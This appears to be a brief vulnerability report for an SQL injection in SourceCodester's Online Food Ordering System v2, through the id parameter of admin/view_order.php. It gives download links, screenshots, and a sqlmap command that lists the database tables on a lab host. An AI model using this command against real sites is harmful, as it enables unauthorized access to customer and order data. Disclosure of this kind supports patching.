vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212478763-1effb63f-d18d-4974-b447-978624cc0ba9.png)
sqlmap.py -u "http://192.168.249.88/php-fos-db/admin/view_order.php?id=1" -D fos_db --tables
![image](https://user-images.githubusercontent.com/30823782/212478783-2927f026-4f45-4b58-9262-2e51158491ff.png)


